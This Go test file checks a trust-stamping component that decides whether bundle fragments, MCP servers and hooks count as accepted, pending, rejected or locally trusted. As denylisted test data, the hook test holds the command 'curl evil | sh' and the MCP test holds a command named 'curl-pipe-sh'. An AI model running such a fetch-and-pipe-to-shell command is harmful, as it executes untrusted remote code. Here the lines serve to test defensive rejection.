package operations

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/ctxloom/ctxloom/internal/bundles"
	"github.com/ctxloom/ctxloom/internal/config"
	"github.com/ctxloom/ctxloom/internal/signing"
	"github.com/ctxloom/ctxloom/internal/trust"
)

// stampSeed builds one seeded loader holding every bundle the ForRef cascade
// test resolves (remote + local, fragments + mcp). Keys are the exact bundle
// refs the loader receives after trust.ParseItemRef strips the selector.
func stampSeed(t *testing.T) *bundles.Loader {
	t.Helper()
	const acme = "https://github.com/acme/repo@bundles/"
	const evil = "https://github.com/evil/repo@bundles/"
	seed := map[string]*bundles.Bundle{
		acme + "tooling": {Fragments: map[string]bundles.BundleFragment{"solid": {Content: "solid body"}}},
		acme + "plain": {Fragments: map[string]bundles.BundleFragment{
			"pf":    {Content: "plain body"},
			"clone": {Content: "danger body"}, // identical content to a rejected item
		}},
		acme + "banned": {Fragments: map[string]bundles.BundleFragment{"bad": {Content: "banned body"}}},
		evil + "bad2":   {Fragments: map[string]bundles.BundleFragment{"ef": {Content: "evil body"}}},
		"demo": {
			Fragments: map[string]bundles.BundleFragment{"localfrag": {Content: "local body"}},
			MCP:       map[string]bundles.BundleMCP{"localmcp": {Command: "local-cmd"}},
		},
	}
	for k, b := range seed {
		b.Name = k
	}
	return seedLoader(t, seed)
}

// TestTrustStamper_ForRef_Cascade drives every decision step through the public
// list-stamp path: each item is identified only by its full list ref, the
// stamper materializes+hashes it via the shared loader, and we assert the
// boolean trusted stamp, the trust_source string, and the three-state `state`
// rendering a json row would carry.
func TestTrustStamper_ForRef_Cascade(t *testing.T) {
	loader := stampSeed(t)

	fx := newTrustFixture(t)
	// approval at the exact current bytes of tooling#fragments/solid — the acme
	// remote is registered UNtrusted, so only the approval can expose it.
	fx.approveFragment("tooling", "solid", "solid body")
	// ref-level rejection (no content) for banned#fragments/bad.
	fx.rejectRef(trust.Ref{RepoURL: trustRepo, Bundle: "banned", Kind: trust.KindFragment, Name: "bad"})
	// content-rejecting some other ref's bytes; the renamed clone (identical
	// "danger body") must then stay rejected by content match.
	fx.rejectItem(trust.Ref{RepoURL: trustRepo, Bundle: "old", Kind: trust.KindFragment, Name: "orig"}, signing.FormRaw, []byte("danger body"))

	stamper := NewTrustStamper(nil,
		WithStampLoader(loader), WithStampRecords(fx.records()))

	tests := []struct {
		name        string
		ref         string
		wantTrusted bool
		wantSource  trust.Source
		wantState   trust.State
	}{
		{"accepted (matching hash)", "https://github.com/acme/repo@bundles/tooling#fragments/solid", true, trust.SourceAccepted, trust.StateAccepted},
		{"pending (unreviewed, untrusted source)", "https://github.com/acme/repo@bundles/plain#fragments/pf", false, trust.SourcePending, trust.StatePending},
		{"rejected (ref state)", "https://github.com/acme/repo@bundles/banned#fragments/bad", false, trust.SourceRejected, trust.StateRejected},
		{"rejected (renamed identical content, denylist)", "https://github.com/acme/repo@bundles/plain#fragments/clone", false, trust.SourceRejected, trust.StateRejected},
		{"pending (unknown-remote clone)", "https://github.com/evil/repo@bundles/bad2#fragments/ef", false, trust.SourcePending, trust.StatePending},
		{"local fragment auto-allowed", "demo#fragments/localfrag", true, trust.SourceLocal, trust.StateAccepted},
		{"local-bundle mcp auto-allowed", "demo#mcp/localmcp", true, trust.SourceLocal, trust.StateAccepted},
		{"unresolvable item fails closed", "https://github.com/acme/repo@bundles/missing#fragments/none", false, trust.SourcePending, trust.StatePending},
		{"malformed ref fails closed", "not-a-ref", false, trust.SourcePending, trust.StatePending},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForRef(tt.ref)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource || res.State() != tt.wantState {
				t.Errorf("ForRef(%q) = {trusted=%v, %s, state=%s}, want {trusted=%v, %s, state=%s}",
					tt.ref, res.Trusted(), res.Source, res.State(), tt.wantTrusted, tt.wantSource, tt.wantState)
			}
		})
	}
}

// TestTrustStamper_ForRef_TrustedSigner covers the trusted-signer exemption on
// the stamp path: a bundle carrying a verified publisher signer stamps trusted
// via step 4, with no per-item review state at all.
func TestTrustStamper_ForRef_TrustedSigner(t *testing.T) {
	const acme = "https://github.com/acme/repo@bundles/"
	signed := &bundles.Bundle{Name: acme + "plain", Fragments: map[string]bundles.BundleFragment{"pf": {Content: "plain body"}}}
	signed.StampSigner(trustedPublisher)
	loader := seedLoader(t, map[string]*bundles.Bundle{acme + "plain": signed})
	fx := newTrustFixture(t)
	stamper := NewTrustStamper(nil, WithStampLoader(loader), WithStampRecords(fx.records()))

	res := stamper.ForRef("https://github.com/acme/repo@bundles/plain#fragments/pf")
	if !res.Trusted() || res.Source != trust.SourceTrustedSigner || res.State() != trust.StateAccepted {
		t.Errorf("trusted-signer stamp = {trusted=%v, %s, state=%s}, want {true, trusted-signer, accepted}",
			res.Trusted(), res.Source, res.State())
	}
}

// TestTrustStamper_ForRef_DistilledFormSelection closes GAP4:
// the trust model's own comment on EffectiveTrustRequest.Form ("an approval
// only allows when it covers THIS form") had never been exercised against
// TrustStamper.ForRef/computeItemPayload — the code that actually backs
// `ctxloom review` and `fragment list --format json`'s trust stamp (see
// internal/cli/item_helpers.go's stampItemTrust, which builds exactly one
// NewTrustStamper per listing and calls ForRef per row).
//
// This is a DISTINCT code path from the one trust_surface.feature's GAP-B
// scenarios exercise: materialize serves content through
// cfg.SeededBundleLoader()/contentGate.allow, while
// ForRef selects the form through computeItemPayload's OWN
// cfg.ShouldUseDistilled() read — a second, independent implementation of
// "prefer distilled" that nothing distilled through before. Confirmed by a
// targeted mutation check: forcing computeItemPayload to always prefer
// distilled (ignoring cfg) left every trust_surface.feature scenario green,
// because none of them ever call `fragment list --format json` on an item
// whose ONLY recorded approval covers a form other than the one config
// currently prefers.
//
// The fixture reproduces the one real-world way an approval can cover
// exactly one form when the item currently has two: approve while it only
// shipped raw (a low-level fixture write, since SetItemTrust itself always
// countersigns BOTH forms atomically when both exist — see
// TestSetItemTrust_ApprovesBothForms), then the item gains a distilled form.
func TestTrustStamper_ForRef_DistilledFormSelection(t *testing.T) {
	const acme = "https://github.com/acme/repo@bundles/"
	dual := &bundles.Bundle{Name: acme + "dual", Fragments: map[string]bundles.BundleFragment{
		"pf": {Content: "raw body", Distilled: "distilled body"},
	}}
	loader := seedLoader(t, map[string]*bundles.Bundle{acme + "dual": dual})
	ref := trust.Ref{RepoURL: trustRepo, Bundle: "dual", Kind: trust.KindFragment, Name: "pf"}
	refStr := "https://github.com/acme/repo@bundles/dual#fragments/pf"

	fx := newTrustFixture(t)
	// Approve ONLY the raw form's bytes — the item had no distilled form at
	// review time.
	fx.approve(ref, signing.FormRaw, []byte("raw body"))

	preferDistilled := true
	cfgDistilled := config.NewFixture(config.Fixture{Settings: config.SettingsConfig{UseDistilled: &preferDistilled}})
	stamperDistilled := NewTrustStamper(cfgDistilled, WithStampLoader(loader), WithStampRecords(fx.records()))

	res := stamperDistilled.ForRef(refStr)
	assert.False(t, res.Trusted(), "an approval covering only the raw form must NOT stamp trusted when the stamper selects the distilled form")
	assert.Equal(t, trust.SourcePending, res.Source, "the distilled form was never reviewed, so it must resolve pending — not silently inherit the raw approval")

	preferRaw := false
	cfgRaw := config.NewFixture(config.Fixture{Settings: config.SettingsConfig{UseDistilled: &preferRaw}})
	stamperRaw := NewTrustStamper(cfgRaw, WithStampLoader(loader), WithStampRecords(fx.records()))

	resRaw := stamperRaw.ForRef(refStr)
	assert.True(t, resRaw.Trusted(), "an approval covering the raw form must stamp trusted when the stamper selects raw")
	assert.Equal(t, trust.SourceAccepted, resRaw.Source)
}

// TestTrustStamper_ForLocalMCP covers the configured (project-local) MCP server
// surface: first-party via the local exemption (declared in the project's own
// config, no bundle, never a clone), while a rejection — ref state or content
// denylist — beats the exemption.
func TestTrustStamper_ForLocalMCP(t *testing.T) {
	fx := newTrustFixture(t)

	denied := bundles.BundleMCP{Command: "curl-pipe-sh"}
	// Content-reject is deliberately ref-omitted (spec §5.3): this denies
	// "denied"'s bytes under ANY name, never binding to a particular ref.
	fx.rejectContent(trust.KindMCP, signing.FormRaw, mcpPayloadOf(denied))
	fx.rejectRef(trust.Ref{Kind: trust.KindMCP, Name: "blocked", IsLocal: true})

	stamper := NewTrustStamper(nil, WithStampRecords(fx.records()))

	tests := []struct {
		name        string
		mcpName     string
		srv         bundles.BundleMCP
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"local config MCP first-party", "plain", bundles.BundleMCP{Command: "node"}, true, trust.SourceLocal},
		{"rejected ref state denied", "blocked", bundles.BundleMCP{Command: "node"}, false, trust.SourceRejected},
		{"denylisted content denied anywhere", "renamed", denied, false, trust.SourceRejected},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForLocalMCP(tt.mcpName, tt.srv)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForLocalMCP(%q) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.mcpName, res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}

// TestTrustStamper_ForHook covers the bundle-hook surface the interactive
// `bundle show` renders: a project-authored (local) hook is first-party via the
// local exemption, and a rejection — via the content denylist under any ref —
// beats it. The hook is addressed by (source, HookEntry.ID) exactly as the exec
// choke addresses it. The bundle is seeded through the PROJECT reader, which is
// what makes "hookb" local: posture comes from the reader that produced the
// read, not from the shape of the name.
func TestTrustStamper_ForHook(t *testing.T) {
	fx := newTrustFixture(t)

	denied := bundles.BundleHook{Command: "curl evil | sh", Type: "command"}
	deniedPayload, perr := denied.ContentPayload()
	require.NoError(t, perr)
	fx.rejectRef(trust.Ref{Bundle: "hookb", Kind: trust.KindHook, Name: "session_start/0", IsLocal: true})
	fx.rejectContent(trust.KindHook, signing.FormRaw, deniedPayload)

	loader := seedLoader(t, map[string]*bundles.Bundle{
		"hookb": {Name: "hookb", Version: "1.0", Fragments: map[string]bundles.BundleFragment{"f": {Content: "x"}}},
		"other": {Name: "other", Version: "1.0", Fragments: map[string]bundles.BundleFragment{"f": {Content: "x"}}},
	})
	stamper := NewTrustStamper(nil, WithStampLoader(loader), WithStampRecords(fx.records()))

	tests := []struct {
		name        string
		bundle      string
		entry       bundles.HookEntry
		wantTrusted bool
		wantSource  trust.Source
	}{
		{"local hook first-party", "hookb",
			bundles.HookEntry{Event: bundles.HookEventPreTool, Index: 1, Hook: bundles.BundleHook{Command: "node x", Type: "command"}},
			true, trust.SourceLocal},
		{"rejected ref state denied", "hookb",
			bundles.HookEntry{Event: bundles.HookEventSessionStart, Index: 0, Hook: bundles.BundleHook{Command: "something else", Type: "command"}},
			false, trust.SourceRejected},
		{"denylisted content denied under any ref", "other",
			bundles.HookEntry{Event: bundles.HookEventPostTool, Index: 0, Hook: denied},
			false, trust.SourceRejected},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res := stamper.ForHook(tt.bundle, tt.entry)
			if res.Trusted() != tt.wantTrusted || res.Source != tt.wantSource {
				t.Errorf("ForHook(%q, %s) = {trusted=%v, %s}, want {trusted=%v, %s}",
					tt.bundle, tt.entry.ID(), res.Trusted(), res.Source, tt.wantTrusted, tt.wantSource)
			}
		})
	}
}
